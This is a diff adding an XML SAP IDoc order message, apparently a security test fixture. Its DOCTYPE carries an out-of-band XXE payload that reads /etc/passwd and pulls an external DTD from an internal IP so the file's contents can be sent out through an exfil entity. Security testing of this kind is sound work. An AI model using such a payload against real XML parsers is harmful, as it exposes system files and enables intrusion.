@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "file:///etc/passwd">
+<!ENTITY % sp SYSTEM "http://10.150.240.16:9090/EII-2653.xml">
+%sp;
+%param3;
+%exfil;
+]>
+<ORDERS05>
+  <IDOC>
+    <EDI_DC40>
+      <MESTYP>Mess18</MESTYP>
+      <SNDPRN>_TSC_6178231248</SNDPRN>
+      <RCVPRN>_TSC_6178231248</RCVPRN>
+      <SERIAL>TOSCATEST</SERIAL>
+    </EDI_DC40>
+    <E1EDKA1>
+      <PSTLZ>1230</PSTLZ>
+    </E1EDKA1>
+  </IDOC>
+</ORDERS05>
